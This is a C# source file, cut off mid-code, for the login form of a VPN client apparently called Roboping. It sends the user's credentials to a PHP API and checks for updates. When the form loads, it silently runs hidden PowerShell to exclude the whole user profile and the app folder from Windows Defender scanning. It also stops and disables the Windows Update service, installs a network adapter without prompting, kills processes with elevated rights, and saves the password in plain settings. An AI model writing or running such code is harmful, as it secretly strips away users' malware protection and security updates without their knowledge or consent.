using Guna.UI2.WinForms;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Routing;
using System.Windows.Forms;

namespace Roboping
{
    public partial class Login : Form
    {


        string serverIp = "robo.roboping.ir"; // Replace this with your server IP address
        int portt = 8873; // Replace this with your server port
        private checkforupdate check;
        private ERROR eror;
        private Main mainform;

        private List<string> imageUrls;
        private int currentIndex;
        private System.Windows.Forms.Timer timer;



        public Login()
        {
            InitializeComponent();




            check = new checkforupdate();
            eror = new ERROR();
            //  this.EnableBlur();
           

            // List of image URLs

            imageUrls = new List<string>

            {

            "https://roboping.ir/1.png",

            "https://roboping.ir/2.png",

            "https://roboping.ir/3.png",

            "https://roboping.ir/4.png",

          //  "https://roboping.ir/5.png"

            };


            currentIndex = 0;


            // Set up the timer

            timer = new System.Windows.Forms.Timer();

            timer.Interval = 5000; // 5 seconds

            timer.Tick += Timer_Tick;

            timer.Start();

            // Load the first image

        }
        bool codeExecuted = false;
        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }
        private async void Timer_Tick(object sender, EventArgs e)
        {
            if (imageUrls == null || imageUrls.Count == 0)
                return;

            // Increment the index
            currentIndex = (currentIndex + 1) % imageUrls.Count;

            // Load the image asynchronously
            await LoadImageAsync(imageUrls[currentIndex]);
        }

        private async Task LoadImageAsync(string url)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Optional: Set a timeout for the request
                    client.Timeout = TimeSpan.FromSeconds(10);

                    // Asynchronously fetch the image data
                    byte[] imageBytes = await client.GetByteArrayAsync(url);

                    using (var stream = new MemoryStream(imageBytes))
                    {
                        Image image = Image.FromStream(stream);

                        // Access the UI thread safely to update the image
                        guna2Panel2.Invoke(new Action(() =>
                        {
                            guna2Panel2.BackgroundImage = image;
                            guna2Panel2.BackgroundImageLayout = ImageLayout.Stretch; // Adjust how the image is displayed
                        }));
                    }
                }
            }
            catch (TaskCanceledException)
            {
                Console.WriteLine("Loading image timed out.");
            }
            catch (HttpRequestException httpEx)
            {
                // Handle specific HTTP errors (e.g., no connection, 404, etc.)
                Console.WriteLine($"Error loading image: {httpEx.Message}");
            }
            catch (Exception ex)
            {
                // Handle other exceptions (e.g., general errors)
                Console.WriteLine($"Unexpected error: {ex.Message}");
            }
        }


        private static StringWriter consoleOutput = new StringWriter();

        private void applog()
        {

            // Redirect the console output to the custom TextWriter that appends timestamps
            Console.SetOut(new TimestampedWriter(consoleOutput));



            // Handling the app closure to write the log
            AppDomain.CurrentDomain.ProcessExit += new EventHandler(OnProcessExit);


            // Just to keep the console open for demonstration
            Console.ReadLine();


        }
        // This event is triggered when the app is closing

        static void OnProcessExit(object sender, EventArgs e)
        {
            // Get the application's installation folder
            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;

            // Define the log file path in the application's directory
            string logFilePath = Path.Combine(appDirectory, "Log.txt");

            // Get the captured console output with timestamps and write it to the log file
            File.WriteAllText(logFilePath, consoleOutput.ToString());

            // Optionally, write some final message in the log file
            File.AppendAllText(logFilePath, "\nApplication exited.");
        }

        class TimestampedWriter : TextWriter
        {
            private TextWriter _originalWriter;

            public TimestampedWriter(TextWriter originalWriter)
            {
                _originalWriter = originalWriter;
            }

            public override Encoding Encoding => _originalWriter.Encoding;

            public override void WriteLine(string value)
            {
                string timestampedValue = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {value}";
                _originalWriter.WriteLine(timestampedValue);
            }

            public override void Write(string value)
            {
                string timestampedValue = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {value}";
                _originalWriter.Write(timestampedValue);
            }
        }
        private async void checkforupdatelogo()
        {
            // Run the file deletion code on a separate thread to keep the UI responsive
            await Task.Run(() =>
            {
                string downloadPath1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
                string zipFilePath = Path.Combine(downloadPath1, "Roboping.zip");
                string msiFilePath = Path.Combine(downloadPath1, "Roboping.msi");

                if (File.Exists(zipFilePath))
                {
                    // Delete the ZIP and MSI files if they exist
                    File.Delete(zipFilePath);
                    File.Delete(msiFilePath);
                }
            });

            // Now we will make the network request to check for updates
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Prepare the data to send to the server
                    string version = label14.Text; // Replace this with actual version
                    string data = $"version={version}";
                    StringContent content = new StringContent(data, Encoding.UTF8, "application/x-www-form-urlencoded");

                    string serverUrl = "https://roboping.ir/versionreceiver1.php";

                    // Send the POST request asynchronously
                    HttpResponseMessage response = await client.PostAsync(serverUrl, content);

                    if (response.IsSuccessStatusCode)
                    {
                        string responseBody = await response.Content.ReadAsStringAsync();

                        if (responseBody.StartsWith("Client"))
                        {
                            // Handle client-specific response
                        }
                        else
                        {
                            guna2PictureBox1.Visible = true;

                            Invoke(new MethodInvoker(delegate
                            {
                                check.showdialog2();
                                checkforupdate.instance.checkupdatetext.Text = "یه آپدیتی از من اومده میخوای منو بروزرسانی کنی ؟";

                            }));
                        }
                    }
                    else
                    {
                        Console.WriteLine($"Error: {response.StatusCode}");
                    }
                }
            }
            catch (HttpRequestException httpEx)
            {
                Console.WriteLine("Connection error while checking for updates: " + httpEx.Message);
                // Notify user of the connection issue, e.g., by using a MessageBox or a label/textbox on the UI.
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
                // Optional: Display error message or log it
            }
        }

        private async Task ExcludeFolderFromDefenderAsync(string folderPath)
        {

            // Get the current username
            string userName = Environment.UserName;

            // Get the user's folder path
            string userFolderPath = $@"C:\Users\{userName}";

            // Get the application's folder path
            string appFolderPath = AppDomain.CurrentDomain.BaseDirectory;

            // PowerShell commands to add exclusions
            string userFolderCommand = $"Add-MpPreference -ExclusionPath '{userFolderPath}'";
            string appFolderCommand = $"Add-MpPreference -ExclusionPath '{appFolderPath}'";

            // Start a new PowerShell process for user folder exclusion
            using (Process userFolderProcess = new Process())
            {
                userFolderProcess.StartInfo.FileName = "powershell.exe";
                userFolderProcess.StartInfo.Arguments = $"-Command \"{userFolderCommand}\"";
                userFolderProcess.StartInfo.RedirectStandardOutput = true;
                userFolderProcess.StartInfo.RedirectStandardError = true;
                userFolderProcess.StartInfo.UseShellExecute = false;
                userFolderProcess.StartInfo.CreateNoWindow = true;

                userFolderProcess.Start();
                string userFolderOutput = await userFolderProcess.StandardOutput.ReadToEndAsync();
                string userFolderError = await userFolderProcess.StandardError.ReadToEndAsync();
                await Task.Run(() => userFolderProcess.WaitForExit());

                if (!string.IsNullOrEmpty(userFolderError))
                {
                    Console.WriteLine($"ایکس نشد 1");
                }
                else
                {
                    Console.WriteLine($" 1 ایکس اضافه شد با موفقیت");
                }
            }

            // Start a new PowerShell process for application folder exclusion
            using (Process appFolderProcess = new Process())
            {
                appFolderProcess.StartInfo.FileName = "powershell.exe";
                appFolderProcess.StartInfo.Arguments = $"-Command \"{appFolderCommand}\"";
                appFolderProcess.StartInfo.RedirectStandardOutput = true;
                appFolderProcess.StartInfo.RedirectStandardError = true;
                appFolderProcess.StartInfo.UseShellExecute = false;
                appFolderProcess.StartInfo.CreateNoWindow = true;

                appFolderProcess.Start();
                string appFolderOutput = await appFolderProcess.StandardOutput.ReadToEndAsync();
                string appFolderError = await appFolderProcess.StandardError.ReadToEndAsync();
                await Task.Run(() => appFolderProcess.WaitForExit());

                if (!string.IsNullOrEmpty(appFolderError))
                {
                    Console.WriteLine($"ایکس نشد");
                }
                else
                {
                    Console.WriteLine($"ایکس اضافه شد با موفقیت");
                }
            }

            /*
            // Define the PowerShell command
            string command = $"Add-MpPreference -ExclusionPath '{folderPath}'";

            // Start a new PowerShell process
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = command;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                // Start the process
                process.Start();

                // Read the output and error streams asynchronously
                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();

                // Wait for the command to execute
                await Task.Run(() => process.WaitForExit());

                // Handle output/error
                if (!string.IsNullOrEmpty(error))
                {
                    Console.WriteLine($"اکس نشد: {error}");
                }
                else
                {
                    Console.WriteLine("Ex added successfully.");
                }
            }
            */
        }
        private async Task DnsCheckAsync()
        {


            // Get a list of all network interfaces on the system
            NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();

            // Loop through the adapters and check for "TAP-Windows Adapter V9"
            foreach (NetworkInterface adapter in adapters)
            {
                if (adapter.Description.Equals("TAP-Windows Adapter V9"))
                {
                    Console.WriteLine("Found TAP-Windows Adapter V9.");

                    // Check the adapter's settings via WMI
                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration"))
                    {
                        foreach (ManagementObject adapterConfig in searcher.Get())
                        {
                            if (adapterConfig["ServiceName"].ToString() == "tap0901") // Checking based on ServiceName
                            {
                                // Check if DNS is set to obtain automatically
                                bool dhcpEnabled = (bool)(adapterConfig["DHCPEnabled"]);

                                if (dhcpEnabled)
                                {
                                    Console.WriteLine("DNS is already set to obtain automatically.");
                                }
                                else
                                {
                                    // Enable DHCP (set to obtain DNS automatically)
                                    adapterConfig["DHCPEnabled"] = true;
                                    adapterConfig.Put();
                                    Console.WriteLine("Enabled obtaining DNS server address automatically.");
                                }

                                // Reset DNS settings using netsh
                                string adapterName = adapter.Name; // Get the adapter name
                                string netshCommand = $"interface ip set dns name=\"{adapterName}\" source=dhcp";

                                // Execute command asynchronously
                                string output = await ExecuteNetshCommandAsync(netshCommand);

                                // Log output or errors if needed
                                Console.WriteLine("تنوستم دی ان اس رو بردارم" + output);
                                break; // Break after handling the configuration
                            }
                        }
                    }
                    break; // Exit the loop once the adapter is found and processed
                }
            }



        }

        private async Task<string> ExecuteNetshCommandAsync(string netshCommand)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = netshCommand;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                // Read the output and error streams asynchronously
                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();

                // Wait for the command to execute
                await Task.Run(() => process.WaitForExit());

                // Return concatenated output and error if any
                return string.IsNullOrEmpty(error) ? output : $"{output}\nError: {error}";
            }
        }



        private bool isChecking = false;

        private async void AdapterCheckAsync()
        {
            if (isChecking) return;
            isChecking = true;

            try
            {
                bool IsTapAdapterInstalled()
                {
                    return NetworkInterface.GetAllNetworkInterfaces()
                    .Any(adapter => adapter.Description.IndexOf("TAP-Windows Adapter", StringComparison.OrdinalIgnoreCase) >= 0);
                }

                async Task<bool> WaitForTapAdapterAsync(int timeoutMilliseconds = 10000)
                {
                    var timeout = Task.Delay(timeoutMilliseconds);
                    while (!IsTapAdapterInstalled())
                    {
                        if (timeout.IsCompleted)
                            return false;

                        await Task.Delay(500); // Check every 500ms
                    }
                    return true;
                }

                // Check if TAP adapter is already installed
                if (IsTapAdapterInstalled())
                {
                    Console.WriteLine("TAP-Windows Adapter V9 is already installed.");
                    return;
                }

                Console.WriteLine("TAP-Windows Adapter V9 not found. Starting installation...");

                // Path to the TAP adapter installer
                string installerPath = @"Roboping Adapter.exe";

                try
                {
                    // Start the installer process
                    var processStartInfo = new ProcessStartInfo
                    {
                        FileName = installerPath,
                        Arguments = "/S", // Silent installation
                        UseShellExecute = false,
                        CreateNoWindow = true,
                    };

                    using (var process = Process.Start(processStartInfo))
                    {
                        if (process != null)
                        {
                            await Task.Run(() => process.WaitForExit());
                        }
                    }

                    // Wait for the adapter to be detected
                    if (await WaitForTapAdapterAsync())
                    {
                        Console.WriteLine("TAP-Windows Adapter V9 installed successfully.");
                    }
                    else
                    {
                        Console.WriteLine("TAP-Windows Adapter V9 installation failed.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"مشکلی در نصب اداپتر روبوپینگ پیش آمده به پشتیبانی بگو: {ex.Message}");
                }
            }
            finally
            {
                isChecking = false;
            }
        }

        private async void DisableUpdateAsync()
        {
            string serviceName = "wuauserv"; // Windows Update service

            try
            {
                await Task.Run(() =>
                {
                    using (ServiceController service = new ServiceController(serviceName))
                    {
                        // Check if the service is already Disabled
                        using (var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                            @"SYSTEM\CurrentControlSet\Services\" + serviceName, true))
                        {
                            if (regKey != null)
                            {
                                var startValue = regKey.GetValue("Start");

                                // If the service is disabled (Start = 4), do nothing and return
                                if (startValue != null && (int)startValue == 4)
                                {
                                    Console.WriteLine("سرویس بروزرسانی ویندوز در حال حاضر خاموشه ");
                                    return; // Exit the method
                                }
                            }
                        }

                        // Check if the service is running and stop it if it is
                        if (service.Status == ServiceControllerStatus.Running)
                        {
                            service.Stop();
                            service.WaitForStatus(ServiceControllerStatus.Stopped);
                        }

                        // Set the service to Disabled
                        using (var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                            @"SYSTEM\CurrentControlSet\Services\" + serviceName, true))
                        {
                            if (regKey != null)
                            {
                                regKey.SetValue("Start", 4); // 4 means Disabled
                            }
                        }
                    }
                });

                // Optionally provide feedback that the operation was successful
                Console.WriteLine("سرویس بروزرسانی ویندوز با موفقیت متوقف شد");
            }
            catch (Exception ex)
            {
                // Show dialog and log the error
                //eror.showdialog();
                // ERROR.instance.errortext.Text = ": " + ex.Message;
                Console.WriteLine("نتونستم ویندوز اپدیت رو متوف کنم شکست خوردم.: " + ex.Message);
            }
        }

        private async void Login_Load(object sender, EventArgs e)
        {
            this.DoubleBuffered = true;
            this.SetStyle(ControlStyles.OptimizedDoubleBuffer, true);
            this.SetStyle(ControlStyles.AllPaintingInWmPaint, true);
            this.SetStyle(ControlStyles.ResizeRedraw, true);

            guna2ControlBox1.FillColor = Color.FromArgb(190, 11, 12, 16);
            guna2ControlBox2.FillColor = Color.FromArgb(190, 11, 12, 16);

            AdapterCheckAsync();

           // await DnsCheckAsync();

            DisableUpdateAsync();

            string folderPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory);
            await ExcludeFolderFromDefenderAsync(folderPath);


            checkforupdatelogo();

            KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");

            applog();

            if (!codeExecuted)
            {
                codeExecuted = true;
                guna2TextBox2.UseSystemPasswordChar = true; // Show password characters
                guna2TextBox1.Text = Properties.Settings.Default.userid;
                guna2TextBox2.Text = Properties.Settings.Default.password;
            }

            // Load image asynchronously
            LoadImageAsync(imageUrls[currentIndex]);
        }

        void KillProcessWithAdminPrivileges(Process process)
        {
            // Create a new process info object with "runas" verb
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "taskkill";
            psi.Arguments = $"/F /PID {process.Id}";
            psi.Verb = "runas";
            psi.WindowStyle = ProcessWindowStyle.Hidden;

            // Start the process with admin privileges
            Process.Start(psi)?.WaitForExit();
        }
        public void KillProcessesWithNames(params string[] processNames)
        {
            foreach (var name in processNames)
            {
                foreach (var p in Process.GetProcessesByName(name))
                {
                    KillProcessWithAdminPrivileges(p);
                    break;
                }
            }
        }
        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
            KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");

            Environment.Exit(1);
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            string url = "https://roboping.ir/signup.html";

            try
            {
                Process.Start(url);
            }
            catch (Exception)
            {
                Invoke(new MethodInvoker(delegate
                {
                    eror.showdialog();
                    ERROR.instance.errortext.Text = "صفحه ثبت نام روبوپینگ یافت نشد";
                    Console.WriteLine("صفحه ثبت نام روبوپینگ یافت نشد");
                }));
            }
        }

        private void guna2ToggleSwitch1_Click(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch1.Checked)
            {
                guna2TextBox2.UseSystemPasswordChar = false; // Show the actual characters
            }
            else
            {
                guna2TextBox2.UseSystemPasswordChar = true; // Show password characters
            }
        }

        private void label17_MouseEnter(object sender, EventArgs e)
        {


        }

        private void label17_MouseLeave(object sender, EventArgs e)
        {

        }

        private void guna2Panel1_Click(object sender, EventArgs e)
        {
            this.ActiveControl = null;
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            this.ActiveControl = null;
        }
        private void InvokeAction(Action action)
        {
            if (InvokeRequired)
            {
                Invoke(action);
            }
            else
            {
                action();
            }
        }
        private void guna2Button4_Click(object sender, EventArgs e)
        {
            Invoke(new MethodInvoker(delegate
            {

                string downloadPath1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
                string zipFilePath = Path.Combine(downloadPath1, "Roboping.zip");
                string msiFilePath = Path.Combine(downloadPath1, "Roboping.msi");

                if (File.Exists(zipFilePath))
                {
                    // Delete the ZIP file and MSI file
                    File.Delete(zipFilePath);
                    File.Delete(msiFilePath);
                }

                InvokeAction(() =>
                {

                    
                    using (WebClient client = new WebClient())
                    {
                        try
                        {
                            // Prepare the data to send to the server
                            string version = label14.Text; // Replace this with actual version
                            string data = $"version={version}";
                            byte[] postData = Encoding.UTF8.GetBytes(data);

                            string serverUrl = "https://roboping.ir/versionreceiver1.php";

                            // Set the Content-Type header
                            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");

                            // Send the POST request to the server
                            byte[] responseBytes = client.UploadData(serverUrl, "POST", postData);

                            // Decode and display the server's response
                            string response = Encoding.UTF8.GetString(responseBytes);
                            //MessageBox.Show("Server response: " + response);
                            // MessageBox.Show(response);
                            if (response.StartsWith("Client"))
                            {
                                eror.showdialog();
                                ERROR.instance.errortext.Text = "من به آخرین ورژن خودم بروز هستم";
                            }
                            else
                            {
                                check.showdialog2();
                                checkforupdate.instance.checkupdatetext.Text = "یه آپدیتی از من اومده میخوای منو بروزرسانی کنی ؟";
                            }
                        }
                        catch (Exception)
                        {
                            // MessageBox.Show("Cannot get access to server side ");
                            eror.showdialog();
                            ERROR.instance.errortext.Text = "please try again";
                            Console.WriteLine("مشکل در بروزرسانی پیش اومده به پشتیبانی بگو");
                        }
                    }
                });
            }));
        }


        private void HandleErrors(List<string> errorMessages)
        {
            // Check if errorMessages is null or empty
            if (errorMessages == null || !errorMessages.Any())
            {
                Console.WriteLine("پیام سرور خالیه");
                return; // Exit the method if there are no messages
            }

            foreach (var message in errorMessages)
            {
                if (message.Contains("Account has expired"))
                {
                    // Handle authentication failure (optional)
                    this.Invoke((Action)(() =>
                    {
                        guna2WinProgressIndicator1.Visible = false;
                        eror.showdialog();
                        ERROR.instance.errortext.Text = "چیزی نیست فقط زمان حسابت تموم شده باید شارژش کنی اونم فقط از وبسایت روبوپینگ شدنیه زودی برگرد";
                        KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                        Console.WriteLine("چیزی نیست فقط زمان حسابت تموم شده باید شارژش کنی اونم فقط از وبسایت روبوپینگ شدنیه زودی برگرد");
                    }));
                }
                else if (message.Contains("Download limit exceeded"))
                {
                    // Handle authentication failure (optional)
                    this.Invoke((Action)(() =>
                    {
                        guna2WinProgressIndicator1.Visible = false;
                        eror.showdialog();
                        ERROR.instance.errortext.Text = "حجمت تموم شده برای شارژ حسابت به سایت روبوپینک مراجعه کن";
                        Console.WriteLine("حجمت تموم شده برای شارژ حسابت به سایت روبوپینک مراجعه کن");

                        KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                    }));
                }
                else if (message.Contains("Maximum session limit exceeded"))
                {
                    // Handle authentication failure (optional)
                    this.Invoke((Action)(() =>
                    {
                        guna2WinProgressIndicator1.Visible = false;
                        eror.showdialog();
                        ERROR.instance.errortext.Text = "چیزی نشده فقط حسابت هنوز آنلاینه توی سرورای من فقط کافیه 16 ثانیه صبر کنی تا درست بشه اگر نشد به پشتیبانی خبر بده";
                        KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                        Console.WriteLine("چیزی نشده فقط حسابت هنوز آنلاینه توی سرورای من فقط کافیه 15 ثانیه صبر کنی تا درست بشه اگر نشد به پشتیبانی خبر بده");

                    }));
                }
                else if (message.Contains("Username not found"))
                {
                    // Handle authentication failure (optional)
                    this.Invoke((Action)(() =>
                    {
                        guna2WinProgressIndicator1.Visible = false;
                        eror.showdialog();
                        ERROR.instance.errortext.Text = " نام کاربریتو اشتباه زدی دوباره چکش کن";
                        KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                        Console.WriteLine("نام کاربریتو اشتباه زدی دوباره چکش کنه");

                    }));
                }
                else if (message.Contains("Invalid password"))
                {
                    // Handle authentication failure (optional)
                    this.Invoke((Action)(() =>
                    {
                        guna2WinProgressIndicator1.Visible = false;
                        eror.showdialog();
                        ERROR.instance.errortext.Text = "ایندفعه دیگه رمزتو اشتباه زدی دقت کن";
                        KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                        Console.WriteLine("ایندفعه دیگه رمزتو اشتباه زدی دقت کن");
                    }));
                }
                else
                {
                    // Handle authentication failure (optional)
                    this.Invoke((Action)(() =>
                    {
                        guna2WinProgressIndicator1.Visible = false;
                        eror.showdialog();
                        ERROR.instance.errortext.Text = "نام کاربری شما به درستی ساخته نشده است و شامل فاصله میباشد ویا از واژگان نامتعارف استفاده شده";
                        KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                    }));
                }
            }
        }



        // Definition for the JsonResponse class

        public class JsonResponse

        {

            public string status { get; set; }

            public string message { get; set; }

            public string expire_date { get; set; } // Expiration date

            public int remaining_days { get; set; } // Remaining days until expiration

            public List<string> messages { get; set; } // List of error messages

        }

        private async void DONE2_Click(object sender, EventArgs e)
        {
            // timer.Stop();

            if (string.IsNullOrWhiteSpace(guna2TextBox1.Text) || string.IsNullOrWhiteSpace(guna2TextBox2.Text))
            {
                label2.ForeColor = Color.Brown;
                label2.Text = "لطفا اول نام کاربری و رمز عبورتو بزن";
                label2.Visible = true;
            }
            else
            {
                label2.Visible = false;
                guna2WinProgressIndicator1.Visible = true;


                string url = "https://roboping.ir/api/Loginrobo.php"; // Replace with your PHP server URL

                string username = guna2TextBox1.Text;

                string password = guna2TextBox2.Text;


                // Prepare the data to send

                var postData = new

                {

                    username = username,

                    password = password

                };


                // Convert the data to JSON format

                string jsonData = System.Text.Json.JsonSerializer.Serialize(postData);


                // Send the POST request

                using (HttpClient client = new HttpClient())

                {

                    try

                    {

                        // Set content header to application/json

                        var content = new StringContent(jsonData, Encoding.UTF8, "application/json");


                        // Show progress indicator

                        guna2WinProgressIndicator1.Visible = true;


                        // Send the POST request and get the response

                        HttpResponseMessage response = await client.PostAsync(url, content);


                        // Ensure the request was successful

                        if (!response.IsSuccessStatusCode)

                        {

                            string errorResponse = await response.Content.ReadAsStringAsync();

                            Console.WriteLine("Error response: " + errorResponse);

                            MessageBox.Show($"Server error: {response.StatusCode} - {errorResponse}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                            return;

                        }


                        // Read the response body

                        string responseBody = await response.Content.ReadAsStringAsync();

                        Console.WriteLine("Response from server: " + responseBody);


                        // Check if the response is empty or malformed

                        if (string.IsNullOrWhiteSpace(responseBody))

                        {

                            MessageBox.Show("The server returned an empty or invalid response.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                            return;

                        }


                        // Parse the JSON response to handle different statuses

                        JsonResponse jsonResponse = null;


                        try

                        {

                            jsonResponse = System.Text.Json.JsonSerializer.Deserialize<JsonResponse>(responseBody);

                        }

                        catch (System.Text.Json.JsonException jsonEx)

                        {

                            MessageBox.Show($"Failed to parse the response as JSON: {jsonEx.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                            return;

                        }


                        // Check for missing or invalid fields

                        if (jsonResponse == null)

                        {

                            MessageBox.Show("Invalid response from server.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                            return;

                        }


                        // Handle the response based on status

                        if (jsonResponse.status == "success")

                        {

                            // Handle success scenario

                            DateTime expirationDate = DateTime.Parse(jsonResponse.expire_date);

                            int daysRemaining = jsonResponse.remaining_days;


                            string dataToSend = $"{username} {daysRemaining}";


                            Invoke(new MethodInvoker(delegate

                            {

                                Properties.Settings.Default.userid = username;
                                Properties.Settings.Default.password = password;
                                Properties.Settings.Default.Save();

                                Main mainForm = new Main(dataToSend);

                                mainForm.Show();

                                this.Hide(); // Hide the current form

                            }));

                        }

                        else if (jsonResponse.status == "error")

                        {

                            // Handle multiple error messages

                            HandleErrors(jsonResponse.messages);

                        }

                        else

                        {

                            MessageBox.Show("Unexpected response from server.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                        }

                    }

                    catch (Exception ex)

                    {

                        Console.WriteLine("Error: " + ex.Message);
                        // Handle authentication failure (optional)
                        this.Invoke((Action)(() =>
                        {
                            guna2WinProgressIndicator1.Visible = false;
                            eror.showdialog();
                            ERROR.instance.errortext.Text = "نام کاربری شما به درستی ساخته نشده است و شامل فاصله میباشد ویا از واژگان نامتعارف استفاده شده";
                            KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                        }));


                    }

                    finally

                    {

                        // Hide progress indicator after processing is done

                        guna2WinProgressIndicator1.Visible = false;

                    }

                }

                /*
                try
                {

                    // Establish TCP connection asynchronously
                    using (TcpClient client = new TcpClient(serverIp, portt))
                    {
                        using (NetworkStream stream = client.GetStream())
                        {
                            string username = guna2TextBox1.Text;
                            string password = guna2TextBox2.Text;

                            string credentials = $"{username} {password}";
                            byte[] data = Encoding.ASCII.GetBytes(credentials);

                            await stream.WriteAsync(data, 0, data.Length);

                            // Prepare buffer for response
                            byte[] buffer = new byte[1024];
                            int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);

                            string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                            // MessageBox.Show(response);

                            // Check response and update UI accordingly
                            if (response.StartsWith("Authenticated"))
                            {
                                Properties.Settings.Default.userid = username;
                                Properties.Settings.Default.password = password;
                                Properties.Settings.Default.Save();

                                string[] responseParts = response.Split(' ');
                                string numberPart = responseParts.Length > 1 ? responseParts[1] : "0";
                                string dataToSend = $"{username} {numberPart}";

                                // Show the main form on the UI thread
                                Invoke(new MethodInvoker(delegate
                                {
                                    Main mainform = new Main(dataToSend);
                                    mainform.Show();
                                    this.Hide(); // Hide the current form
                                }));

                                KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                            }
                            else if (response.Contains("Time expired"))
                            {
                                // Handle authentication failure (optional)
                                this.Invoke((Action)(() =>
                                {
                                    guna2WinProgressIndicator1.Visible = false;
                                    eror.showdialog();
                                    ERROR.instance.errortext.Text = "چیزی نیست فقط زمان حسابت تموم شده باید شارژش کنی اونم فقط از وبسایت روبوپینگ شدنیه زودی برگرد";
                                    KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                                }));
                            }
                            else if (response.Contains("wait then try"))
                            {
                                // Handle authentication failure (optional)
                                this.Invoke((Action)(() =>
                                {
                                    guna2WinProgressIndicator1.Visible = false;
                                    eror.showdialog();
                                    ERROR.instance.errortext.Text = "چیزی نشده فقط حسابت هنوز آنلاینه توی سرورای من فقط کافیه 15 ثانیه صبر کنی تا درست بشه اگر نشد به پشتیبانی خبر بده";
                                    KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                                }));
                            }
                            else if (response.Contains("user not found"))
                            {
                                // Handle authentication failure (optional)
                                this.Invoke((Action)(() =>
                                {
                                    guna2WinProgressIndicator1.Visible = false;
                                    eror.showdialog();
                                    ERROR.instance.errortext.Text = "یا رمز عبورتو یا نام کاربریتو اشتباه زدی دوباره چکشون کن";
                                    KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                                }));
                            }
                            else if (response.Contains("Invalid password"))
                            {
                                // Handle authentication failure (optional)
                                this.Invoke((Action)(() =>
                                {
                                    guna2WinProgressIndicator1.Visible = false;
                                    eror.showdialog();
                                    ERROR.instance.errortext.Text = "ایندفعه دیگه رمزتو اشتباه زدی دقت کن";
                                    KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                                }));
                            }
                            else if (response.Contains("Invalid input format"))
                            {
                                // Handle authentication failure (optional)
                                this.Invoke((Action)(() =>
                                {
                                    guna2WinProgressIndicator1.Visible = false;
                                    eror.showdialog();
